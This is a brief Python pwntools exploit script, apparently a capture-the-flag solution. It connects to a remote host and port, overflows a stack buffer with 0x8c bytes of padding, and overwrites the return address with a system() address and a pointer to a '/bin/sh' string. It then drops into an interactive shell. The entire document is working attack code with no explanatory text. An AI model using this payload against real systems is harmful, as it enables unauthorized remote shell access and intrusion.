from pwn import *

p = remote('220.249.52.133','42268')
binsh = 0x0804a024
sys_addr = 0x0804845C

p.recvline()
payload = 'A'*(0x88+0x4) + p32(sys_addr) + p32(binsh)
p.sendline(payload)
p.interactive()
